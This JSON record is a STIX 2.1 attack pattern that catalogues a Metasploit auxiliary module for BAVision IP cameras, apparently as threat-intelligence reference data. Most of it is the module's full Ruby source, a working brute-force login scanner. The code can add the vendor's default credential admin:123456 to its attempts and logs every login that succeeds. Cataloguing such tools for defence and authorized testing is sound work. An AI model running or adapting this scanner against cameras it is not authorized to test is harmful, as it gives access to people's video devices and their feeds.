{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--8576f5a4-205c-435e-9327-7679c857629c",
    "created": "2024-08-14T16:30:15.616573Z",
    "modified": "2024-08-14T16:30:15.616577Z",
    "name": "BAVision IP Camera Web Server Login",
    "description": " This module will attempt to authenticate to an IP camera created by BAVision via the web service. By default, the vendor ships a default credential admin:123456 to its cameras, and the web server does not enforce lockouts in case of a bruteforce attack. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/bavision_cam_login.rb",
            "external_id": "bavision_cam_login.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'metasploit/framework/login_scanner/bavision_cameras'\nrequire 'metasploit/framework/credential_collection'\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::AuthBrute\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::Scanner\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'        => 'BAVision IP Camera Web Server Login',\n      'Description' => %q{\n        This module will attempt to authenticate to an IP camera created by BAVision via the\n        web service. By default, the vendor ships a default credential admin:123456 to its\n        cameras, and the web server does not enforce lockouts in case of a bruteforce attack.\n      },\n      'Author'      => [ 'sinn3r' ],\n      'License'     => MSF_LICENSE\n    ))\n\n    register_options(\n      [\n        OptBool.new('TRYDEFAULT', [false, 'Try the default credential admin:123456', false])\n      ])\n\n    deregister_options('PASSWORD_SPRAY')\n  end\n\n\n  def scanner(ip)\n    @scanner ||= lambda {\n      cred_collection = build_credential_collection(\n        username: datastore['USERNAME'],\n        password: datastore['PASSWORD']\n      )\n\n      if datastore['TRYDEFAULT']\n        # Add the default username and password\n        print_status(\"Default credential admin:123456 added to the credential queue for testing.\")\n        cred_collection.add_public('admin')\n        cred_collection.add_private('123456')\n      end\n\n      return Metasploit::Framework::LoginScanner::BavisionCameras.new(\n        configure_http_login_scanner(\n          host: ip,\n          port: datastore['RPORT'],\n          cred_details:       cred_collection,\n          stop_on_success:    datastore['STOP_ON_SUCCESS'],\n          bruteforce_speed:   datastore['BRUTEFORCE_SPEED'],\n          connection_timeout: 5,\n          http_username:      datastore['HttpUsername'],\n          http_password:      datastore['HttpPassword']\n        ))\n    }.call\n  end\n\n\n  def report_good_cred(ip, port, result)\n    service_data = {\n      address: ip,\n      port: port,\n      service_name: 'http',\n      protocol: 'tcp',\n      workspace_id: myworkspace_id\n    }\n\n    credential_data = {\n      module_fullname: self.fullname,\n      origin_type: :service,\n      private_data: result.credential.private,\n      private_type: :password,\n      username: result.credential.public,\n    }.merge(service_data)\n\n    login_data = {\n      core: create_credential(credential_data),\n      last_attempted_at: DateTime.now,\n      status: result.status,\n      proof: result.proof\n    }.merge(service_data)\n\n    create_credential_login(login_data)\n  end\n\n\n  def report_bad_cred(ip, rport, result)\n    invalidate_login(\n      address: ip,\n      port: rport,\n      protocol: 'tcp',\n      public: result.credential.public,\n      private: result.credential.private,\n      realm_key: result.credential.realm_key,\n      realm_value: result.credential.realm,\n      status: result.status,\n      proof: result.proof\n    )\n  end\n\n  def bruteforce(ip)\n    scanner(ip).scan! do |result|\n      case result.status\n      when Metasploit::Model::Login::Status::SUCCESSFUL\n        print_brute(:level => :good, :ip => ip, :msg => \"Success: '#{result.credential}'\")\n        report_good_cred(ip, rport, result)\n      when Metasploit::Model::Login::Status::UNABLE_TO_CONNECT\n        vprint_brute(:level => :verror, :ip => ip, :msg => result.proof)\n        report_bad_cred(ip, rport, result)\n      when Metasploit::Model::Login::Status::INCORRECT\n        vprint_brute(:level => :verror, :ip => ip, :msg => \"Failed: '#{result.credential}'\")\n        report_bad_cred(ip, rport, result)\n      end\n    end\n  end\n\n  def run_host(ip)\n    unless scanner(ip).check_setup\n      print_brute(:level => :error, :ip => ip, :msg => 'Target is not BAVision IP camera web server.')\n      return\n    end\n\n    bruteforce(ip)\n  end\nend\n"
}